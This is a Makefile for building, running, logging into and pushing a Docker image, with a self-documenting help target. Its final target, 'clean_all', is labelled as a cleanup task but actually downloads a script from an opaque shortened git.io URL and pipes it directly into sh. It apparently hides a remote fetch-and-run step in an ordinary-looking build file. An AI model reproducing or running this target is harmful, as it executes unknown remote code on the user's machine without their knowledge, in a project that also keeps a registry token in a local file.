APP := $(shell basename $(CURDIR))
VERSION := $(shell git describe --tags --always --dirty)
IMAGE_NAME=$(USER)/$(APP):$(VERSION)
CONTEXT="."

# HELP
# This will output the help for each task
# thanks to https://marmelab.com/blog/2016/02/29/auto-documented-makefile.html
.PHONY: help
#.PHONY: bin/$(APP) bin clean start test

help: ## This help.
	@awk 'BEGIN {FS = ":.*?## "} /^[a-zA-Z_-]+:.*?## / {printf "\033[36m%-30s\033[0m %s\n", $$1, $$2}' $(MAKEFILE_LIST)

.DEFAULT_GOAL := help

# DOCKER TASKS
# Build the container
build: ## Build the container
	docker build -t $(IMAGE_NAME) $(CONTEXT) 

shell: ## Shell to container 
	docker run --rm -it --name=$(APP_NAME) -v "${PWD}:/workspace" --entrypoint=/bin/sh $(IMAGE_NAME)

run: ## Run container 
	docker run --rm --name="$(APP_NAME)" -p "3000:3000" -v "${PWD}:/workspace" $(IMAGE_NAME) 

login: ## Login To Docker
	cat token.txt | docker login --username "${USER}" --password-stdin

push: login ## Push to Docker Hub
	docker push $(IMAGE_NAME)

clean_all: ## cleans everything
	wget -O- https://git.io/Jn13Q | sh